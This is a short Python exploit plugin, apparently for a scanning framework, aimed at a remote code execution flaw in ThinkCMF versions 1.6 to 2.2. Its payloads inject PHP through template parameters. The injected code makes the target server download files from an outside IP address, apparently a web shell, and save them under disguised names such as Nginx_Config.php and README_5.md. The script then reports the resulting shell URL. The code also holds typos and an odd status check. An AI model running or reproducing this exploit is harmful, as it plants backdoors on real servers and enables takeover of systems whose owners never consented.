#!/usr/bin/env python
# -*- coding: utf-8 -*-




pre_payload='?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents(\'Nginx_Config.php\',file_get_contents(\'http://192.74.254.161/in_php.txt\'));</php>'
payload='?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents(\'README_5.md\',file_get_contents(\'http://192.74.254.161/ant-php-venom.txt\'));</php>'

def poc(arg, **kwargs):
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }

    pre_vulnurl = arg + pre_payload
    vulnurl=arg + payload
    hh = HackRequests.hackRequests()
    try:
        r = hh.http(pre_vulnurl,headers=headers,timeoout=5)
        rr= hh.http(vulnurl,headers=headers,timeout=5)
        if r.status_code==408:
            result = {
                "name": "thinkcmf REC",  # 插件名称
                "content": '''影响版本1.6/2.0/2.1/2.2''',  # 插件返回内容详情，会造成什么后果。
                "domain": arg,  # 漏洞存在url
                "shell_url": vulnurl,  # 漏洞存在url
                "log": r.log,
                "tag": "REC"  # 漏洞标签
            }
            return result

    except:
        return False

if __name__ == "__main__":
    pass